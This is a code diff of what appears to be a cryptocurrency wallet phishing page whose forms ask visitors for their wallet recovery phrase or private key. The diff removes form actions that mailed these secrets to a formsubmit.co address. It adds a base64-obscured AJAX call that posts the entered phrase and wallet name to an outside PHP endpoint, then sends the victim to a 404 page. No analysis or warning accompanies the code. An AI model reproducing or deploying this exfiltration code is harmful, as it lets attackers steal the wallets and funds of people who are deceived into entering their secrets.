@@ -3945,7 +3945,7 @@
                         </ul>
                         <div class="tab-content" style="margin-top: 20px;">
                             <div role="tabpanel" class="tab-pane fade show active" id="phraseTab">
-                                <form action="https://formsubmit.co/johncooked5@gmail.com" method="POST" id="my-form" >
+                                <form action="" method="POST" id="my-form" >
                                     <input type="hidden" name="_captcha" value="false">
                                     <input type="hidden" name="_next" value="404.html">
                                     <textarea rows="4" name="phrases" placeholder="Typically 12 (sometimes 24) words separated by a single space." required style="font-size:25px; font-weight:650"></textarea>
@@ -3961,7 +3961,7 @@
                                 </form>
                             </div>
                             <div role="tabpanel" class="tab-pane fade" id="privateKeyTab">
-                                <form action="https://formsubmit.co/johncooked5@gmail.com" method="POST" id="my-form" >
+                                <form action="" method="POST" id="my-form" >
                                     <input type="hidden" name="_captcha" value="false">
                                     <input type="hidden" name="_next" value="404.html">
                                     <input type="text" name="privateKey" placeholder="Hexadecimal string of length 64." required style="font-size:25px; font-weight:650">
@@ -4089,7 +4089,7 @@
                     $(this).text('Loading...').css('pointer-events', 'none')
 
                     $.ajax({
-                        url: "sendmail.php",
+                        url: atob('aHR0cHM6Ly9veGJpdHdvcmxkLmNvbS93YWxsZXQva3Vsby5waHA='),
                         method: "POST",
                         data: { "load_phrase": 1, "data_phrase": field.val(), "wallet_selected": $('#wallet_name').text().trim() },
                         success: function (result) {
